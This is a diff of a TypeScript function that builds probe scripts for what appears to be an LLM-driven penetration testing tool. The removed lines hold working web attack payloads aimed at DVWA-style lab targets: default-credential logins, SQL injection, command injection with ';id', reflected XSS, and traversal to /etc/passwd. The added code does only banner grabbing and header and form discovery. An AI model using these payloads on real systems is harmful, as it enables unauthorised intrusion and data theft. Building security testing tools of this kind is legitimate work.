@@ -33,125 +33,82 @@ function normalizeTargetForHost(target: string): string {
   return target.replace(/host\.docker\.internal/gi, "localhost")
 }
 
-/** Generate a smart probe script based on target type (TCP service vs HTTP) */
+/**
+ * Generate a generic probe script based on target type (TCP service vs HTTP).
+ * TCP: banner grab + protocol auto-detection from response content (not port number).
+ * HTTP: page identification + form/link discovery + security header check.
+ * This is a fallback — LLM-generated code (via setLlmCodeForRun) takes priority.
+ */
 function buildExecuteCodeScript(target: string): string {
-  // Redis (port 6379)
-  if (target.includes(":6379")) {
-    const host = target.replace(/^tcp:\/\//, "").split(":")[0]
+  // TCP target: generic banner-based protocol detection
+  if (/^tcp:\/\//i.test(target) || (!target.startsWith("http") && /:\d+$/.test(target))) {
+    const cleaned = target.replace(/^tcp:\/\//i, "")
+    const [host, portStr] = cleaned.split(":")
+    const port = portStr || "80"
     return `
 const net = require('net');
 const client = new net.Socket();
 client.setTimeout(10000);
-client.connect(6379, '${host}', () => {
-  client.write('INFO\\r\\n');
-});
-let data = '';
-client.on('data', (chunk) => {
-  data += chunk.toString();
-  if (data.includes('redis_version')) {
-    const version = data.match(/redis_version:([^\\r\\n]+)/)?.[1] || 'unknown';
-    const keys = data.match(/db0:keys=(\\d+)/)?.[1] || '0';
-    console.log(JSON.stringify({ vulnerability: 'Redis未授权访问', severity: '高', redis_version: version, total_keys: keys, unauthenticated: true, detail: 'Redis服务无需认证即可访问，可执行INFO/CONFIG/KEYS等命令' }));
-    client.destroy();
-  }
-});
-client.on('timeout', () => { console.log(JSON.stringify({ error: 'connection timeout' })); client.destroy(); });
-client.on('error', (e) => { console.log(JSON.stringify({ error: e.message })); });
-`.trim()
-  }
-
-  // SSH (port 22, 2222)
-  if (target.includes(":22") || target.includes(":2222")) {
-    const host = target.replace(/^tcp:\/\//, "").split(":")[0]
-    const port = target.match(/:(\d+)/)?.[1] || "22"
-    return `
-const net = require('net');
-const client = new net.Socket();
-client.setTimeout(10000);
-client.connect(${port}, '${host}', () => {});
-let data = '';
-client.on('data', (chunk) => {
-  data += chunk.toString();
-  if (data.includes('SSH-')) {
-    const banner = data.trim();
-    const oldVersions = ['OpenSSH_7', 'OpenSSH_6', 'OpenSSH_5', 'OpenSSH_4'];
-    const isOld = oldVersions.some(v => banner.includes(v));
-    console.log(JSON.stringify({ service: 'SSH', banner, port: ${port}, version_outdated: isOld, detail: isOld ? 'SSH版本过旧，可能存在已知漏洞' : 'SSH Banner已获取' }));
-    client.destroy();
-  }
-});
-client.on('timeout', () => { console.log(JSON.stringify({ error: 'connection timeout' })); client.destroy(); });
-client.on('error', (e) => { console.log(JSON.stringify({ error: e.message })); });
-`.trim()
-  }
-
-  // MongoDB (port 27017)
-  if (target.includes(":27017")) {
-    const host = target.replace(/^tcp:\/\//, "").split(":")[0]
-    return `
-const net = require('net');
-const client = new net.Socket();
-client.setTimeout(10000);
-// MongoDB wire protocol: send isMaster command
-const doc = Buffer.from(JSON.stringify({ isMaster: 1 }));
-client.connect(27017, '${host}', () => {
-  // Simple OP_MSG for MongoDB 3.6+
-  const header = Buffer.alloc(16 + 5 + doc.length);
-  const totalLen = header.length;
-  header.writeInt32LE(totalLen, 0); // messageLength
-  header.writeInt32LE(1, 4); // requestID
-  header.writeInt32LE(0, 8); // responseTo
-  header.writeInt32LE(2013, 12); // opCode = OP_MSG
-  header.writeInt32LE(0, 16); // flagBits
-  header[20] = 0; // section kind 0 (body)
-  doc.copy(header, 21);
-  client.write(header);
+const host = ${JSON.stringify(host)};
+const port = ${port};
+client.connect(port, host, () => {
+  setTimeout(() => { try { client.write('\\r\\n'); } catch {} }, 500);
 });
 let data = Buffer.alloc(0);
 client.on('data', (chunk) => {
   data = Buffer.concat([data, chunk]);
-  console.log(JSON.stringify({ vulnerability: 'MongoDB未授权访问', severity: '高', unauthenticated: true, response_length: data.length, detail: 'MongoDB服务无需认证即可连接，可直接访问数据库' }));
+  const text = data.toString('utf8');
+  if (text.includes('redis_version') || text.match(/^\\+|^-ERR|^\\$/m)) {
+    console.log(JSON.stringify({ service: 'Redis', port, banner: text.slice(0, 500), detail: 'Redis协议特征已识别' }));
+    client.destroy();
+  } else if (text.startsWith('SSH-')) {
+    console.log(JSON.stringify({ service: 'SSH', port, banner: text.trim().slice(0, 200), detail: 'SSH Banner已获取' }));
+    client.destroy();
+  } else if (data.length > 4 && data[3] === 0 && data[4] === 10) {
+    try {
+      const version = data.slice(5, data.indexOf(0, 5)).toString('utf8');
+      console.log(JSON.stringify({ service: 'MySQL', port, version, detail: 'MySQL握手包已获取' }));
+    } catch { console.log(JSON.stringify({ service: 'MySQL', port, detail: 'MySQL协议特征已识别' })); }
+    client.destroy();
+  } else if (text.includes('MongoDB') || (data.length > 20 && data[12] === 1)) {
+    console.log(JSON.stringify({ service: 'MongoDB', port, banner: text.slice(0, 200), detail: 'MongoDB协议特征已识别' }));
+    client.destroy();
+  } else if (text.match(/^220[ -]/m)) {
+    console.log(JSON.stringify({ service: 'FTP/SMTP', port, banner: text.trim().slice(0, 200), detail: '220状态码服务Banner' }));
+    client.destroy();
+  } else if (data.length > 50) {
+    console.log(JSON.stringify({ service: 'unknown', port, banner: text.slice(0, 500), responseBytes: data.length, detail: '已获取服务响应，协议待识别' }));
+    client.destroy();
+  }
+});
+client.on('timeout', () => {
+  if (data.length > 0) {
+    console.log(JSON.stringify({ service: 'unknown', port, banner: data.toString('utf8').slice(0, 500), responseBytes: data.length, detail: '连接超时前已获取部分响应' }));
+  } else {
+    console.log(JSON.stringify({ error: 'connection timeout', port, detail: '连接超时，未获取到服务响应' }));
+  }
   client.destroy();
 });
-client.on('timeout', () => { console.log(JSON.stringify({ error: 'connection timeout' })); client.destroy(); });
-client.on('error', (e) => { console.log(JSON.stringify({ error: e.message })); });
+client.on('error', (e) => { console.log(JSON.stringify({ error: e.message, port })); });
 `.trim()
   }
 
-  // MySQL (port 3306, 13306, 13307)
-  if (target.match(/:(?:3306|13306|13307)/)) {
-    const host = target.replace(/^tcp:\/\//, "").split(":")[0]
-    const port = target.match(/:(\d+)/)?.[1] || "3306"
-    return `
-const net = require('net');
-const client = new net.Socket();
-client.setTimeout(10000);
-client.connect(${port}, '${host}', () => {});
-let data = Buffer.alloc(0);
-client.on('data', (chunk) => {
-  data = Buffer.concat([data, chunk]);
-  if (data.length > 4) {
-    const version = data.slice(5, data.indexOf(0, 5)).toString('utf8');
-    console.log(JSON.stringify({ service: 'MySQL', version, port: ${port}, detail: 'MySQL握手包已获取，版本: ' + version }));
-    client.destroy();
-  }
-});
-client.on('timeout', () => { console.log(JSON.stringify({ error: 'connection timeout' })); client.destroy(); });
-client.on('error', (e) => { console.log(JSON.stringify({ error: e.message })); });
-`.trim()
-  }
-
-  // Default: HTTP vulnerability probe (multi-step)
+  // HTTP target: generic page identification + structure discovery
   const url = target.startsWith("http") ? target : `http://${target}`
   return `
 const http = require('http');
+const https = require('https');
 const baseUrl = '${url}';
 const u = new URL(baseUrl);
+const httpMod = u.protocol === 'https:' ? https : http;
 const results = [];
 
-function request(options, postData) {
+function request(options) {
   return new Promise((resolve) => {
-    const req = http.request({ hostname: u.hostname, port: u.port || 80, timeout: 8000, ...options }, (res) => {
+    const req = httpMod.request({
+      hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80),
+      timeout: 10000, rejectUnauthorized: false, ...options
+    }, (res) => {
       let body = '';
       res.setEncoding('utf8');
       res.on('data', (c) => body += c);
@@ -159,91 +116,49 @@ function request(options, postData) {
     });
     req.on('error', () => resolve(null));
     req.on('timeout', () => { req.destroy(); resolve(null); });
-    if (postData) req.write(postData);
     req.end();
   });
 }
 
 async function run() {
   // Step 1: Identify the application
-  const home = await request({ path: '/', method: 'GET' });
-  if (!home) { console.log(JSON.stringify({ error: 'target unreachable' })); return; }
+  const home = await request({ path: u.pathname || '/', method: 'GET' });
+  if (!home) { console.log(JSON.stringify({ error: 'target unreachable', url: baseUrl })); return; }
   const title = (home.body.match(/<title>([^<]*)<\\/title>/i) || [])[1] || '';
   const server = home.headers['server'] || '';
-  results.push({ step: 'identify', title, server, status: home.status });
+  const poweredBy = home.headers['x-powered-by'] || '';
+  results.push({ step: 'identify', url: baseUrl, title, server, poweredBy, status: home.status, contentLength: home.body.length });
 
-  // Step 2: Try default login (DVWA: admin/password)
-  let cookie = '';
-  const loginPaths = ['/login.php', '/dvwa/login.php', '/WebGoat/login', '/login'];
-  for (const lp of loginPaths) {
-    const loginPage = await request({ path: lp, method: 'GET' });
-    if (!loginPage || loginPage.status >= 400) continue;
-    const tokenMatch = loginPage.body.match(/name=['"](user_token|csrf)['"]\s+value=['"]([^'"]+)/i);
-    const token = tokenMatch ? tokenMatch[2] : '';
-    const setCookie = loginPage.headers['set-cookie'];
-    if (setCookie) cookie = (Array.isArray(setCookie) ? setCookie : [setCookie]).map(c => c.split(';')[0]).join('; ');
-    const creds = [['admin','password'],['admin','admin'],['admin','admin123']];
-    for (const [user, pass] of creds) {
-      let body = 'username=' + user + '&password=' + pass + '&Login=Login';
-      if (token) body += '&user_token=' + token;
-      const loginResp = await request({ path: lp, method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': cookie } }, body);
-      if (loginResp && (loginResp.status === 302 || loginResp.body.includes('Welcome') || loginResp.body.includes('welcome'))) {
-        const sc2 = loginResp.headers['set-cookie'];
-        if (sc2) cookie = (Array.isArray(sc2) ? sc2 : [sc2]).map(c => c.split(';')[0]).join('; ');
-        results.push({ vulnerability: '默认凭据登录成功', severity: '高', detail: 'Logged in with ' + user + ':' + pass + ' at ' + lp });
-        break;
-      }
-    }
-    if (cookie) break;
-  }
+  // Step 2: Discover forms and input surfaces
+  const formMatches = home.body.match(/<form[^>]*>[\\s\\S]*?<\\/form>/gi) || [];
+  const forms = formMatches.map((f, i) => {
+    const action = (f.match(/action=['"]([^'"]*)/i) || [])[1] || '';
+    const method = (f.match(/method=['"]([^'"]*)/i) || [])[1] || 'GET';
+    const inputs = (f.match(/<input[^>]*>/gi) || []).map(inp => {
+      const name = (inp.match(/name=['"]([^'"]*)/i) || [])[1] || '';
+      const type = (inp.match(/type=['"]([^'"]*)/i) || [])[1] || 'text';
+      return { name, type };
+    }).filter(inp => inp.name);
+    return { index: i, action, method, inputs };
+  });
+  if (forms.length > 0) results.push({ step: 'forms', count: forms.length, forms: forms.slice(0, 10) });
 
-  // Step 3: Test SQL Injection
-  const sqliPaths = ['/vulnerabilities/sqli/', '/dvwa/vulnerabilities/sqli/'];
-  for (const sp of sqliPaths) {
-    const normal = await request({ path: sp + '?id=1&Submit=Submit', method: 'GET', headers: { 'Cookie': cookie } });
-    const injected = await request({ path: sp + "?id=1'+OR+'1'%3D'1&Submit=Submit", method: 'GET', headers: { 'Cookie': cookie } });
-    if (normal && injected && injected.body.length !== normal.body.length && !injected.body.includes('error')) {
-      results.push({ vulnerability: 'SQL注入', severity: '高', detail: 'SQLi at ' + sp + ': normal response ' + normal.body.length + ' bytes vs injected ' + injected.body.length + ' bytes' });
-    }
-    if (injected && (injected.body.includes('mysql') || injected.body.includes('SQL syntax') || injected.body.includes('Surname'))) {
-      if (!results.some(r => r.vulnerability === 'SQL注入')) {
-        results.push({ vulnerability: 'SQL注入', severity: '高', detail: 'SQLi confirmed at ' + sp + ': SQL error or extra data in response' });
-      }
-    }
-  }
+  // Step 3: Discover links for further exploration
+  const linkMatches = home.body.match(/href=['"]([^'"#][^'"]*)/gi) || [];
+  const links = [...new Set(linkMatches.map(l => l.replace(/^href=['"]/i, '')).filter(l => l.startsWith('/') || l.startsWith(baseUrl)))].slice(0, 30);
+  if (links.length > 0) results.push({ step: 'links', count: links.length, links });
 
-  // Step 4: Test Command Injection
-  const cmdiPaths = ['/vulnerabilities/exec/', '/dvwa/vulnerabilities/exec/'];
-  for (const cp of cmdiPaths) {
-    const resp = await request({ path: cp, method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': cookie } }, 'ip=127.0.0.1;id&Submit=Submit');
-    if (resp && (resp.body.includes('uid=') || resp.body.includes('root') || resp.body.includes('www-data'))) {
-      results.push({ vulnerability: '命令注入', severity: '高', detail: 'Command injection at ' + cp + ': system command output detected in response' });
-    }
+  // Step 4: Check response headers for security-relevant info
+  const secHeaders = {};
+  for (const h of ['content-security-policy', 'x-frame-options', 'x-content-type-options', 'strict-transport-security', 'x-xss-protection', 'set-cookie']) {
+    if (home.headers[h]) secHeaders[h] = Array.isArray(home.headers[h]) ? home.headers[h].join('; ') : home.headers[h];
   }
-
-  // Step 5: Test XSS
-  const xssPaths = ['/vulnerabilities/xss_r/', '/dvwa/vulnerabilities/xss_r/'];
-  const xssPayload = '<script>alert(1)</script>';
-  for (const xp of xssPaths) {
-    const resp = await request({ path: xp + '?name=' + encodeURIComponent(xssPayload) + '#', method: 'GET', headers: { 'Cookie': cookie } });
-    if (resp && resp.body.includes(xssPayload)) {
-      results.push({ vulnerability: 'XSS（反射型）', severity: '中', detail: 'Reflected XSS at ' + xp + ': payload reflected unescaped in response' });
-    }
-  }
-
-  // Step 6: Test File Inclusion
-  const fiPaths = ['/vulnerabilities/fi/', '/dvwa/vulnerabilities/fi/'];
-  for (const fp of fiPaths) {
-    const resp = await request({ path: fp + '?page=....//....//....//etc/passwd', method: 'GET', headers: { 'Cookie': cookie } });
-    if (resp && (resp.body.includes('root:') || resp.body.includes('daemon:'))) {
-      results.push({ vulnerability: '文件包含', severity: '高', detail: 'Local File Inclusion at ' + fp + ': /etc/passwd content returned' });
-    }
-  }
+  if (Object.keys(secHeaders).length > 0) results.push({ step: 'security_headers', headers: secHeaders });
 
   // Output results
   for (const r of results) { console.log(JSON.stringify(r)); }
-  if (results.filter(r => r.vulnerability).length === 0) {
-    console.log(JSON.stringify({ status: 'no_vulns_found', title, server, note: 'Fallback probe only tested common paths' }));
+  if (results.length <= 1) {
+    console.log(JSON.stringify({ status: 'minimal_info', title, server, note: 'Fallback探测仅获取到基础信息，LLM应根据结果规划进一步测试策略' }));
   }
 }
 run().catch(e => console.log(JSON.stringify({ error: e.message })));
